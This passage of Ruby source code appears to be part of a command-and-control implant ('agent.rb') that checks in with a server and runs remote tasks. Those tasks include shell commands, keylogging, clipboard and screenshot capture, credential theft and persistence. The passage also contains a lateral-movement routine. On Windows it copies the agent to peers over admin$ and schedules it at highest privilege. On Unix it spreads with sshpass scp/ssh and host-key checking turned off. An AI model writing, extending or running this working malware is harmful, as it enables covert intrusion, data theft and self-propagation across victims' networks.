  lines = ["lateral: #{peers.size} peer(s): #{peers.join(', ')}"]
  deployed = 0
  failed = 0
  skipped = 0

  peers.each do |host|
    if !has_creds
      skipped += 1
      status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)'
    elsif $windows
      r1 = run_shell(%(net use \\\\#{host}\\admin$ /user:#{user} "#{pass}"), 20)
      if r1[1] != 0
        failed += 1
        status = "failed (net use: #{err_brief(r1)})"
      else
        r2 = run_shell(%(copy /y "#{self_path}" "\\\\#{host}\\admin$\\#{basename}"), 20)
        if r2[1] != 0
          failed += 1
          status = "failed (copy: #{err_brief(r2)})"
          run_shell(%(net use \\\\#{host}\\admin$ /delete /y), 20)
        else
          remote = %(\\\\#{host}\\admin$\\#{basename})
          r3 = run_shell(%(schtasks /Create /S #{host} /TN "c2agent-lateral" /TR "#{remote}" /SC ONLOGON /RU #{user} /RP #{pass} /RL HIGHEST /F), 20)
          run_shell(%(net use \\\\#{host}\\admin$ /delete /y), 20)
          deployed += 1
          status = if r3[1].zero?
                     'deployed (file dropped + scheduled c2agent-lateral)'
                   else
                     "deployed (file dropped; task: #{err_brief(r3)})"
                   end
        end
      end
    else
      if `command -v sshpass 2>/dev/null`.strip.empty?
        skipped += 1
        status = 'skipped (sshpass not installed)'
      else
        r1 = run_shell("sshpass -p #{shell_escape(pass)} scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 #{shell_escape(self_path)} #{user}@#{host}:/tmp/#{basename}", 30)
        if r1[1] != 0
          failed += 1
          status = "failed (scp: #{err_brief(r1)})"
        else
          remote = "/tmp/#{basename}"
          rcmd = relaunch_cmd(remote)
          r2 = run_shell("sshpass -p #{shell_escape(pass)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 #{user}@#{host} '#{sh_embed(rcmd)} &>/dev/null &'", 30)
          deployed += 1
          status = if r2[1].zero?
                     'deployed (file uploaded + launched)'
                   else
                     "deployed (file uploaded; launch: #{err_brief(r2)})"
                   end
        end
      end
    end
    lines << "  #{host}: #{status}"
  end
  lines << "lateral: deployed=#{deployed} failed=#{failed} skipped=#{skipped}"
  [truncate_output(lines.join("\n")), 0]
end

def execute_task(task)
  task_id = task['task_id']
  type = task['type']
  args = task['args'] || {}
  logmsg "running task #{task_id} (#{type})"

  case type
  when 'shell'
    timeout = [[(args['timeout'] || SHELL_TIMEOUT).to_i, 1].max, 3600].min
    run_shell(args['command'] || '', timeout)
  when 'download'
    task_download(task_id, args)
  when 'upload'
    task_upload(task_id, args)
  when 'sleep'
    task_sleep(args)
  when 'keylog'
    task_keylog(args)
  when 'clipboard'
    task_clipboard(args)
  when 'screenshot'
    task_screenshot(task_id, args)
  when 'clone'
    task_clone(args)
  when 'steal'
    task_steal(task_id, args)
  when 'persistence'
    task_persistence(args)
  when 'lateral'
    task_lateral(args)
  when 'exit'
    ['exiting', 0, true]
  else
    ["unknown task type: #{type}", 1]
  end
end

# ----------------------------------------------------------------- main

OptionParser.new do |opts|
  opts.banner = "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
  opts.on('--server URL')    { |v| $server = v }
  opts.on('--token TOKEN')   { |v| $token = v }
  opts.on('--interval N')    { |v| $interval = v.to_i }
  opts.on('--jitter N')      { |v| $jitter = v.to_i }
  opts.on('--verbose')       { $verbose = true }
  opts.on('--state FILE')    { |v| $STATE_FILE = v }
end.parse!

$server = ENV['C2_SERVER'] || '' if $server.empty?
$token  = ENV['C2_TOKEN']  || '' if $token.empty?

if $server.empty? || $token.empty?
  $stderr.puts "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
  exit(1)
end
$server = $server.chomp('/')

load_id
register if $agent_id.empty?

logmsg "agent running against #{$server} (interval #{$interval}s)"

loop do
  tasks = checkin
  tasks.each do |task|
    output, exit_code, should_exit = execute_task(task)
    report(task['task_id'], output, exit_code, '')
    if should_exit
      logmsg 'exit task received — shutting down'
      exit(0)
    end
  end
  delay = $interval + ($jitter > 0 ? rand(0..$jitter) : 0)
  sleep(delay)
end
